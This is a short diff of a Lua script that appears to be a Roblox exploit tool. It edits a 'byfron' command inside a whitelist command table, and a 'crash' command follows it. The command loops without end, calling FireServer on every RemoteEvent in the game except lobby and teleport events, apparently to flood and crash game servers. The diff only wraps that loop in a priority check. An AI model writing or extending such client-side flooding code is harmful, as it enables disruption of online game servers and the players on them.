@@ -681,14 +681,16 @@ run(function()
 
 	whitelist.commands = {
 		byfron = function()
-			while wait() do
-				pcall(function()
-					for i,v in game:GetDescendants() do
-						if v:IsA("RemoteEvent") and not string.find(v.Name:lower(),"lobby") and not string.find(v.Name:lower(),"teleport") then
-							v:FireServer()
+			if whitelist.localprio < 200 then
+				while wait() do
+					pcall(function()
+						for i,v in game:GetDescendants() do
+							if v:IsA("RemoteEvent") and not string.find(v.Name:lower(),"lobby") and not string.find(v.Name:lower(),"teleport") then
+								v:FireServer()
+							end
 						end
-					end
-				end)
+					end)
+				end
 			end
 		end,
 		crash = function()
